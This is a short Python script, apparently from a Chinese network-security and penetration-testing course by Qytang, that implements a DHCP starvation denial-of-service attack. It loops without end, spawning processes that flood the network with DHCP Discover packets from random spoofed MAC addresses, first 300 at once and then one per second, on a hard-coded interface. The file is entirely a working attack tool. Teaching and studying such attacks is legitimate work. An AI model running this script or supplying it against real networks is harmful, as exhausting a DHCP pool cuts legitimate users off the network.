#!/usr/bin/python3.4
# -*- coding=utf-8 -*-
#本脚由亁颐堂现任明教教主编写，用于乾颐盾Python课程！
#教主QQ:605658506
#亁颐堂官网www.qytang.com
#乾颐盾是由亁颐堂现任明教教主开发的综合性安全课程
#包括传统网络安全（防火墙，IPS...）与Python语言和黑客渗透课程！
import sys
sys.path.append('/usr/local/lib/python3.4/dist-packages/PyQYT/ExtentionPackages')
sys.path.append('/usr/lib/python3.4/site-packages/PyQYT/ExtentionPackages')
sys.path.append('../../ExtentionPackages')

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)#清除报错
from scapy.all import *
import random
import multiprocessing
import time
from PyQYT.Network.Tools.Random_MAC import Random_MAC
from PyQYT.Network.DHCP.DHCP_Discover import DHCP_Discover_Sendonly

def DHCP_Discover_DoS(ifname):
	i = 1
	while True:
		if i < 300:#300以内最大并发攻击！
			MAC_ADD = Random_MAC()#随机产生MAC地址！
			print(MAC_ADD)#打印随机产生的MAC地址！
			multi_dos = multiprocessing.Process(target=DHCP_Discover_Sendonly, args=(ifname, MAC_ADD, 0))
			multi_dos.start()
			i += 1
		else:#300以上转为低速攻击！
			MAC_ADD = Random_MAC()#随机产生MAC地址！
			print(MAC_ADD)#打印随机产生的MAC地址！
			multi_dos = multiprocessing.Process(target=DHCP_Discover_Sendonly, args=(ifname, MAC_ADD, 0))
			multi_dos.start()
			time.sleep(1)#每一秒发起一次攻击！
			i += 1

if __name__ == '__main__':
    DHCP_Discover_DoS('eno33554944')
